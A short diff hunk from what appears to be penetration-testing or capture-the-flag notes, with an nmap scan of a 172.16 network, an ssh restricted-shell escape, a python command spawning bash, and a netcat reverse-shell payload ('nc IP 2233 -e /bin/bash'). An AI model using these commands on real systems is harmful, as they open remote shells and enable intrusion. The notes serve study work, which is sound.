@@ -95,7 +95,7 @@ sudo nmap -p ****  -sV -A 172.16      # investigate the app of ports.
         ssh mindy@172.16.33.35  -t "bash --noprofile"
 	#inner
 		python -c 'import os; os.system("/bin/bash");'
-
+	#also try /usr/bin/xx to use the tools of OS, like cat wget nc
     exp exploit
         payload = 'nc  IP  2233 -e /bin/bash'
 
